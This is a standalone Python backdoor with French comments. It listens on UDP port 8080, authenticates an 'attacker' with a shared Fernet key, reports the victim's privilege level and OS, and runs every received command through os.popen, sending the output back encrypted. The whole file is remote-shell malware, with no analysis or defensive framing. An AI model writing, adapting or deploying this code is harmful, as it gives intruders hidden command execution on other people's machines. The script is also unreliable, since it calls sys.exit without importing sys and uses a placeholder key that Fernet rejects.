#!/usr/bin/python3

import socket
import os
import platform
from cryptography.fernet import Fernet
import zlib

# Clé partagée pour sécuriser les échanges
SECRET_KEY = b'some_shared_secret_key_32bytes'
cipher = Fernet(SECRET_KEY)

def launch():
    """Initialisation de la connexion avec l'attaquant."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(("", 8080))  # Port configurable
    print("[*] En attente d'une connexion...")
    
    launch = s.recvfrom(1024)
    addr = launch[1][0]
    port = launch[1][1]
    
    # Authentification de l'attaquant
    s.sendto(cipher.encrypt(b'auth_request'), (addr, port))
    auth_response, _ = s.recvfrom(1024)
    if cipher.decrypt(auth_response) != b'auth_ok':
        print("[!] Échec de l'authentification. Fermeture de la connexion.")
        s.close()
        sys.exit(1)
    
    print(f"[*] Connexion authentifiée depuis {addr}:{port}")
    return s, addr, port

s, addr, port = launch()

def getsysinfo():
    """Envoie les informations système de la victime à l'attaquant."""
    try:
        prompt = []
        if hasattr(os, 'getuid') and os.getuid() == 0:
            prompt.append(b'root@')
            prompt.append(b'# ')
        else:
            prompt.append(b'user@')
            prompt.append(b'$ ')
        
        system_info = platform.system()
        prompt.append(system_info.encode())
        prompt = cipher.encrypt(b''.join(prompt))
        s.sendto(prompt, (addr, port))
    except Exception as e:
        s.sendto(cipher.encrypt(f"Error: {str(e)}".encode()), (addr, port))

getsysinfo()

def shell():
    """Boucle principale pour exécuter les commandes de l'attaquant."""
    while True:
        try:
            command, _ = s.recvfrom(1024)
            command = cipher.decrypt(command).decode().strip()
            
            if command.startswith("cd "):
                # Changer de répertoire
                try:
                    path = command[3:].strip()
                    os.chdir(path)
                    response = f"Répertoire changé : {os.getcwd()}"
                except Exception as e:
                    response = f"Erreur : {str(e)}"
            
            elif command == "goodbye":
                # Terminer la connexion
                s.sendto(cipher.encrypt(b'Goodbye master'), (addr, port))
                print("[*] Fermeture de la connexion.")
                s.close()
                break
            
            else:
                # Exécuter une commande système
                try:
                    proc = os.popen(command)
                    output = proc.read()
                    proc.close()
                    if not output:
                        response = "Commande exécutée avec succès, mais aucune sortie."
                    else:
                        response = output.strip()
                except Exception as e:
                    response = f"Erreur : {str(e)}"
            
            # Compression et envoi de la réponse
            compressed_response = zlib.compress(response.encode())
            s.sendto(cipher.encrypt(compressed_response), (addr, port))
        
        except Exception as e:
            error_message = f"Une erreur inattendue s'est produite : {str(e)}"
            s.sendto(cipher.encrypt(zlib.compress(error_message.encode())), (addr, port))

shell()
